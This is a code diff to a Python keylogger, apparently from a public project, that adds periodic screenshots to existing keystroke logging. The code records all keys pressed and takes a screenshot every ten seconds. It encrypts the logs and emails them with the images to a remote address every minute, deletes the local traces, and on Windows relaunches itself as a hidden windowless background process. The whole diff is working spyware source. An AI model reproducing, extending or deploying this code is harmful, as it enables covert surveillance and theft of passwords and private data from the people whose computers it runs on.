@@ -8,113 +8,133 @@ import schedule
 from pynput import keyboard
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 from cryptography.fernet import Fernet
 import subprocess
+import pyscreenshot as ImageGrab
 
-# keylog.txt and key file will be saved at C:\Users\<username>\.keylogs
+# Paths and constants
+LOG_DIRECTORY = os.path.expanduser('~') + "\\.keylogs\\"
+KEY_FILE = LOG_DIRECTORY + "key.key"
+LOG_FILE = LOG_DIRECTORY + "keylog.txt"
+SCREENSHOT_INTERVAL = 10  # in seconds
+EMAIL_INTERVAL = 1  # in minutes
+
+# Email credentials
+EMAIL_ADDRESS = "your-email-id"
+EMAIL_PASSWORD = "your-app-password"
+EMAIL_TO = "your-reciever-email"
+
+# Ensure log directory exists
+if not os.path.exists(LOG_DIRECTORY):
+    os.makedirs(LOG_DIRECTORY)
+
 # Encryption setup
-key = Fernet.generate_key()
-cipher_suite = Fernet(key)
+def load_or_generate_key():
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, 'rb') as kf:
+            return kf.read()
+    else:
+        key = Fernet.generate_key()
+        with open(KEY_FILE, 'wb') as kf:
+            kf.write(key)
+        return key
 
-# Path to save the key
-key_file = os.path.expanduser('~') + "\\.keylogs\\key.key" #paste this key file in decrypt_log file
-
-# Generate and save the key if it doesn't exist
-if not os.path.exists(key_file):
-    key = Fernet.generate_key()
-    with open(key_file, 'wb') as kf:
-        kf.write(key)
-else:
-    with open(key_file, 'rb') as kf:
-        key = kf.read()
-
+key = load_or_generate_key()
 cipher_suite = Fernet(key)
 
 # Logging setup
-log_directory = os.path.expanduser('~') + "\\.keylogs\\"
-if not os.path.exists(log_directory):
-    os.makedirs(log_directory)
-log_file = log_directory + "keylog.txt" # you can edit keylog file name here
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-# Email credentials
-email_address = "email-id"
-email_password = "your app password" #enable 2FA of account to get app password
-email_to = "reciever-email"
-email_interval = 1  # in minutes
-
-def encrypt_message(message):
-    return cipher_suite.encrypt(message.encode())
-
-def decrypt_message(encrypted_message):
-    return cipher_suite.decrypt(encrypted_message).decode()
+def encrypt_data(data):
+    return cipher_suite.encrypt(data)
 
 def send_email():
     try:
-        with open(log_file, 'r') as file:
+        with open(LOG_FILE, 'r') as file:
             log_data = file.read()
-        
-        if log_data:
-            encrypted_log = encrypt_message(log_data)
 
-            msg = MIMEMultipart()
-            msg['From'] = email_address
-            msg['To'] = email_to
-            msg['Subject'] = 'Keylogger Report'
+        if not log_data:
+            return
 
-            body = "Attached is the encrypted log file."
-            msg.attach(MIMEText(body, 'plain'))
-            attachment = MIMEText(encrypted_log.decode('utf-8'), 'plain')
-            attachment.add_header('Content-Disposition', 'attachment', filename='log.txt')
-            msg.attach(attachment)
+        msg = MIMEMultipart()
+        msg['From'] = EMAIL_ADDRESS
+        msg['To'] = EMAIL_TO
+        msg['Subject'] = 'Keylogger Report'
 
-            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-            server.ehlo()
-            #server.starttls()
-            server.ehlo()
-            server.login(email_address, email_password)
-            text = msg.as_string()
-            server.sendmail(email_address, email_to, text)
-            server.quit()
+        body = "Attached is the encrypted log file and screenshots."
+        msg.attach(MIMEText(body, 'plain'))
 
-            with open(log_file, 'w'):
-                pass  # Clear the log file after sending
+        # Attach log file
+        encrypted_log = encrypt_data(log_data.encode())
+        attachment = MIMEBase('application', 'octet-stream')
+        attachment.set_payload(encrypted_log)
+        encoders.encode_base64(attachment)
+        attachment.add_header('Content-Disposition', f'attachment; filename="log.txt"')
+        msg.attach(attachment)
+
+        # Attach screenshots
+        for filename in os.listdir(LOG_DIRECTORY):
+            if filename.endswith(".png"):
+                with open(os.path.join(LOG_DIRECTORY, filename), 'rb') as f:
+                    part = MIMEBase('application', 'octet-stream')
+                    part.set_payload(f.read())
+                    encoders.encode_base64(part)
+                    part.add_header('Content-Disposition', f'attachment; filename="{filename}"')
+                    msg.attach(part)
+                os.remove(os.path.join(LOG_DIRECTORY, filename))
+
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        server.sendmail(EMAIL_ADDRESS, EMAIL_TO, msg.as_string())
+        server.quit()
+
+        with open(LOG_FILE, 'w'):
+            pass  # Clear the log file
 
     except Exception as e:
         logging.error(f"Failed to send email: {e}")
 
-def on_press(key): # Starts Listener
+def on_press(key):
     try:
-        logging.info('Key {} pressed.'.format(key.char))
+        logging.info(f'Key {key.char} pressed.')
     except AttributeError:
-        logging.info('Special Key {} pressed.'.format(key))
+        logging.info(f'Special Key {key} pressed.')
 
 def on_release(key):
     if key == keyboard.Key.esc:
-        return False  # Stop listener
+        return False
 
 def start_keylogger():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-def schedule_email():
-    schedule.every(email_interval).minutes.do(send_email)
+def capture_screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        timestamp = time.strftime("%Y%m%d-%H%M%S")
+        screenshot.save(os.path.join(LOG_DIRECTORY, f"screenshot_{timestamp}.png"))
+    except Exception as e:
+        logging.error(f"Failed to capture screenshot: {e}")
+
+def schedule_tasks():
+    schedule.every(EMAIL_INTERVAL).minutes.do(send_email)
+    schedule.every(SCREENSHOT_INTERVAL).seconds.do(capture_screenshot)
     while True:
         schedule.run_pending()
         time.sleep(1)
 
 def run_as_background():
     if sys.platform == "win32":
-        # Check if the script is already running as a background process
         if "background" in sys.argv:
             keylogger_thread = threading.Thread(target=start_keylogger)
-            email_thread = threading.Thread(target=schedule_email)
+            scheduler_thread = threading.Thread(target=schedule_tasks)
             keylogger_thread.start()
-            email_thread.start()
+            scheduler_thread.start()
             keylogger_thread.join()
-            email_thread.join()
+            scheduler_thread.join()
         else:
-            # Start a new background process
             subprocess.Popen([sys.executable, __file__, "background"], creationflags=subprocess.CREATE_NO_WINDOW)
             sys.exit(0)
 
